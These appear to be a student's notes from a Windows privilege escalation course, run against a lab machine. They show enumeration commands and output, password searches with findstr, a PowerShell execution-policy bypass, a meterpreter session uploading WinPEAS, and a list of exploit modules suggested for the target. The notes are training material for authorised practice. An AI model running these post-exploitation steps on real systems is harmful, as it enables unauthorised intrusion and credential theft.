```

TCM's Windows Privilege Escalation Beginner Course

Resources for windows privilege escalation guides:

Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html

PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

Sushant 747's Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources

EXECUTABLES:

WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS **************BEST
Seatbelt - https://github.com/GhostPack/Seatbelt
Watson - https://github.com/rasta-mouse/Watson
SharpUp - https://github.com/GhostPack/SharpUp

POWERSHELL:

PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
Sherlock - https://github.com/rasta-mouse/Sherlock
JAWS - https://github.com/411Hall/JAWS

OTHER: WHEN THE OTHERS DONT WORK

Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation		***AWESOME PRIVESC CHECKLIST
Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester    (RAN LOCALLY ON ATTACKING MACHINE)
Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/	(METASPLOIT)
```

```
####################################    INITIAL ENUMERATION    ####################################

 /\/\\/\/\/\/\/\/\/\/\/\/\		SYSTEM ENUMERATION		/\/\\/\/\/\/\/\/\/\/\/\/\							# quick wins

c:\windows\system32\inetsrv>systeminfo
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          14/1/2023, 2:34:12 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.451 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.536 MB
Virtual Memory: In Use:    605 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::aca4:dfd8:19d8:70b2
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e

systeminfo | findstr /B /C:"OS Version" /C:"System Type" /C:"OS Name" 									# Windows version of grep
c:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Version" /C:"System Type" /C:"OS Name"
systeminfo | findstr /B /C:"OS Version" /C:"System Type" /C:"OS Name"
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
```

```
C:\Users\jorde>wmic qfe																					# Shows latest patch and who installed.
Caption                                     CSName           Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=5020880  DESKTOP-60O7K7C  Update                        KB5020880               NT AUTHORITY\SYSTEM  12/18/2022
https://support.microsoft.com/help/5012170  DESKTOP-60O7K7C  Security Update               KB5012170               NT AUTHORITY\SYSTEM  12/7/2022
https://support.microsoft.com/help/5022303  DESKTOP-60O7K7C  Security Update               KB5022303               NT AUTHORITY\SYSTEM  1/13/2023
                                            DESKTOP-60O7K7C  Update                        KB5020487               NT AUTHORITY\SYSTEM  12/14/2022


C:\Users\jorde>wmic qfe get Caption,Description,HotFixID,InstalledOn									# a way to filter results to what we want
Caption                                     Description      HotFixID   InstalledOn
http://support.microsoft.com/?kbid=5020880  Update           KB5020880  12/18/2022
https://support.microsoft.com/help/5012170  Security Update  KB5012170  12/7/2022
https://support.microsoft.com/help/5022303  Security Update  KB5022303  1/13/2023
                                            Update           KB5020487  12/14/2022

C:\Users\jorde>wmic logicaldisk get caption,description,providername									# way to see what drives are on system.
Caption  Description       ProviderName
C:       Local Fixed Disk
```

```
 /\/\\/\/\/\/\/\/\/\/\/\/\		USER ENUMERATION		/\/\\/\/\/\/\/\/\/\/\/\/\

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>whoami /priv										#shows privilges
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 													######################### looking for this!
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>whoami /groups										
# shows groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>net user							
# shows users on this machine.
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest                    
The command completed with one or more errors.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>net user babis						
# shows user specific information						
net user babis
User name                    babis
Full Name                    
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/3/2017 1:15:19 ��
Password expires             Never
Password changeable          18/3/2017 1:15:19 ��
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   18/3/2017 1:17:50 ��

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.

c:\windows\system32\inetsrv>net user administrator				
# just another example with admin.
net user administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/3/2017 1:16:02 ��
Password expires             Never
Password changeable          18/3/2017 1:16:02 ��
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   14/1/2023 2:34:52 ��

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

C:\Users\jorde>net localgroup											
# displays local groups

Aliases for \\DESKTOP-60O7K7C

-------------------------------------------------------------------------------
*__vmware__
*Administrators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Performance Log Users
*Performance Monitor Users
*Remote Management Users
*System Managed Accounts Group
*Users
The command completed successfully.

c:\windows\system32\inetsrv>net localgroup administrators			
# displays specific known group information
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```

```
/\/\\/\/\/\/\/\/\/\/\/\/\		NETWORK ENUMERATION		/\/\\/\/\/\/\/\/\/\/\/\/\

c:\windows\system32\inetsrv>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::58c0:f1cf:abc6:bb9e
   Temporary IPv6 Address. . . . . . : dead:beef::aca4:dfd8:19d8:70b2
   Link-local IPv6 Address . . . . . : fe80::58c0:f1cf:abc6:bb9e%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.5
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2e45%15
                                       10.10.10.2

Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>ipconfig /all				
# can see dns servers/default gateways.
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : devel
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #3
   Physical Address. . . . . . . . . : 00-11-22-33-44-55
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::58c0:f1cf:abc6:bb9e(Preferred) 
   Temporary IPv6 Address. . . . . . : dead:beef::aca4:dfd8:19d8:70b2(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::58c0:f1cf:abc6:bb9e%15(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.5(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2e45%15
                                       10.10.10.2
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{C57F02F8-DF4F-40EE-BC21-A206B3F501E4}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>arp -a						
# arp tables
arp -a

Interface: 10.10.10.5 --- 0xf
  Internet Address      Physical Address      Type
  10.10.10.2            00-50-56-b9-2e-45     dynamic   
  10.10.10.255          ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>route print								
# shows routes
route print
===========================================================================
Interface List
 15...00 11 22 33 44 55 ......vmxnet3 Ethernet Adapter #3
  1...........................Software Loopback Interface 1
 11...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
 12...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.10.10.2       10.10.10.5    261
       10.10.10.0    255.255.255.0         On-link        10.10.10.5    261
       10.10.10.5  255.255.255.255         On-link        10.10.10.5    261
     10.10.10.255  255.255.255.255         On-link        10.10.10.5    261
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link        10.10.10.5    261
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  255.255.255.255  255.255.255.255         On-link        10.10.10.5    261
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
 15    261 ::/0                     fe80::250:56ff:feb9:2e45
  1    306 ::1/128                  On-link
 15     13 dead:beef::/64           On-link
 15    261 dead:beef::58c0:f1cf:abc6:bb9e/128
                                    On-link
 15    261 dead:beef::aca4:dfd8:19d8:70b2/128
                                    On-link
 15    261 fe80::/64                On-link
 15    261 fe80::58c0:f1cf:abc6:bb9e/128
                                    On-link
  1    306 ff00::/8                 On-link
 15    261 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>netstat -ano				
# open ports, whos all communicating? possible port forwarding
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1356
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       376
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       744
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       820
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       468
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       484
  TCP    10.10.10.5:139         0.0.0.0:0              LISTENING       4
  TCP    10.10.10.5:49189       10.10.16.21:4444       ESTABLISHED     976
  TCP    [::]:21                [::]:0                 LISTENING       1356
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       660
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5357              [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       376
  TCP    [::]:49153             [::]:0                 LISTENING       744
  TCP    [::]:49154             [::]:0                 LISTENING       820
  TCP    [::]:49155             [::]:0                 LISTENING       468
  TCP    [::]:49156             [::]:0                 LISTENING       484
  UDP    0.0.0.0:123            *:*                                    936
  UDP    0.0.0.0:3702           *:*                                    1324
  UDP    0.0.0.0:3702           *:*                                    1324
  UDP    0.0.0.0:5355           *:*                                    1036
  UDP    0.0.0.0:53402          *:*                                    1324
  UDP    10.10.10.5:137         *:*                                    4
  UDP    10.10.10.5:138         *:*                                    4
  UDP    10.10.10.5:1900        *:*                                    1324
  UDP    127.0.0.1:1900         *:*                                    1324
  UDP    127.0.0.1:57544        *:*                                    1324
  UDP    [::]:123               *:*                                    936
  UDP    [::]:3702              *:*                                    1324
  UDP    [::]:3702              *:*                                    1324
  UDP    [::]:5355              *:*                                    1036
  UDP    [::]:53403             *:*                                    1324
  UDP    [::1]:1900             *:*                                    1324
  UDP    [::1]:57543            *:*                                    1324
  UDP    [fe80::58c0:f1cf:abc6:bb9e%15]:1900  *:*                                    1324
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

```
/\/\\/\/\/\/\/\/\/\/\/\/\		HUNTING PASSWORDS		/\/\\/\/\/\/\/\/\/\/\/\/\ 	
# refer to shushant 747 total oscp guide as well or payload all the things

c:\Windows\System32>findstr /si password *.txt *.config *.ini						# a away to look for passwords in directories / config
findstr /si password *.txt *.config *.ini
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password.";
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          >> Msg1="Please enter your password.";
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                    Please enter your password.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

```
/\/\\/\/\/\/\/\/\/\/\/\/\		AV ENUMERATION		/\/\\/\/\/\/\/\/\/\/\/\/\ 

c:\windows\system32\inetsrv>sc query windefend						
# used to look up antiviruses
sc query windefend

SERVICE_NAME: windefend 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>sc queryex type= service	
# shows all services that are running on the machine, what ami up againsts?

SERVICE_NAME: DPS
DISPLAY_NAME: Diagnostic Policy Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1200
        FLAGS              : 

SERVICE_NAME: eventlog
DISPLAY_NAME: Windows Event Log
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 744
        FLAGS              : 

SERVICE_NAME: EventSystem
DISPLAY_NAME: COM+ Event System
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 936
        FLAGS              : 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>netsh advfirewall firewall dump								
# how to look at firewalls on windows with 2 different commands ##
netsh advfirewall firewall dump


c:\windows\system32\inetsrv>netsh firewall show state									#####
netsh firewall show state

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable
Group policy version              = Windows Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
No ports are currently open on all network interfaces.

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c:\windows\system32\inetsrv>netsh firewall show config											
# look at firewall configs
netsh firewall show config

Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Allowed programs configuration for Domain profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Domain profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------

ICMP configuration for Domain profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Standard profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Service configuration for Standard profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          File and Printer Sharing
Enable   No          Network Discovery

Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Standard profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------

ICMP configuration for Standard profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Log configuration:
-------------------------------------------------------------------
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
Max file size   = 4096 KB
Dropped packets = Disable
Connections     = Disable

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .

```

```
####################################    AUTOMATED TOOLS    ####################################

/\/\\/\/\/\/\/\/\/\/\/\/\		AUTOMATED TOOL OVERVIEW		/\/\\/\/\/\/\/\/\/\/\/\/\ 

EXECUTABLES:

WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS **************BEST
Seatbelt - https://github.com/GhostPack/Seatbelt
Watson - https://github.com/rasta-mouse/Watson
SharpUp - https://github.com/GhostPack/SharpUp

POWERSHELL:

PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
Sherlock - https://github.com/rasta-mouse/Sherlock
JAWS - https://github.com/411Hall/JAWS

OTHER: WHEN THE OTHERS DONT WORK

Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation		***AWESOME PRIVESC CHECKLIST
Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester    (RAN LOCALLY ON ATTACKING MACHINE)
Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/	(METASPLOIT)
```

```
meterpreter > cd c:\\windows\\temp						
# where to drop tools on windows.
meterpreter > pwd
c:\windows\temp
meterpreter > 
```

```
meterpreter > upload /home/kali/Documents/transfer/winPEASx64.exe											#uploading tools on windows process
[*] uploading  : /home/kali/Documents/transfer/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 1.88 MiB of 1.88 MiB (100.0%): /home/kali/Documents/transfer/winPEASx64.exe -> winPEASx64.exe
[*] uploaded   : /home/kali/Documents/transfer/winPEASx64.exe -> winPEASx64.exe
meterpreter > 
```

```
c:\windows\temp>powershell -ep bypass									
# how to check if powershell is available on system, if its not there it hangs...
powershell -ep bypass
Windows PowerShell 
Copyright (C) 2009 Microsoft Corporation. All rights reserved.



hangingand banging
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
meterpreter > load powershell											
# how to load powershell through meterpreter
Loading extension powershell...Success.
meterpreter > 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
meterpreter > run post/multi/recon/local_exploit_suggester											#meterpreter local exploit suggester example
# this tool is fucky, doesnt really work with python 3 dont really recommend even trying it.

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 167 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 5:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

c:\windows\temp>systeminfo						
# while doing above, also drop into shell and pull sysinfo and save on linux attacking machine (sysinfo.txt)
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          14/1/2023, 2:34:12 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
